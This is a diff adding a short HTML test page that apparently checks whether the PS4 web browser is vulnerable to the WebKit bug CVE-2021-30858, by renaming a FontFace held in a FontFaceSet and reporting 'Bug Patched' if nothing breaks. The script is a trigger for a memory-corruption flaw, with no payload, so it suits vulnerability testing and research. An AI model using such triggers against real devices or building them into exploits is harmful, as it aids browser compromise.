@@ -1,0 +1,21 @@
+<html>
+    <title>CVE-2021-30858 Webkit Test</title>
+    <script>
+
+        async function testwebkit() {
+
+            alert("Testing CVE-2021-30858 on PS4 Browser.. Rev3.\n This should not give you any 'Message Alert' or 'Memory Error'.\n If 'Bug Patched' Msgs is shown means this bug does not work on your current FW and has been patched!!!");
+            let font = new FontFace('font1', '',{});
+            var fontFaceSet = new FontFaceSet([font]);
+            font.family = 'font2';
+            alert("Bug Patched :(");
+
+        }
+
+    </script>
+
+    <body>
+        <button onclick="testwebkit()">Test CVE Bug</button>
+    </body>
+
+</html>
